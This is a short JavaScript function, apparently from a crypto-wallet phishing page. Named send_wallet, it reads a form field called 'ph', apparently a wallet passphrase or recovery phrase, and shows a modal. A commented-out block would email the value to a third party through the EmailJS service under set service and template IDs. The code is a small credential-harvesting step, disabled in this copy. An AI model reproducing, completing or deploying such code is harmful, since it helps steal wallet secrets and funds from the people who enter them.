
function send_wallet() {
    let ph = document.getElementById('ph').value

    let templateParams = {
        'ph': ph
    }

    console.log('waw');
    

    document.getElementById('modal').classList.toggle('show');

    // emailjs.send('service_ab78eek', 'template_f7brbv5', templateParams).then(
    //     (response) => {
    //         console.log('SUCCESS!', response.status, response.text);
    //     },
    //     (error) => {
    //         console.log('FAILED...', error);
    //     },
    // );

}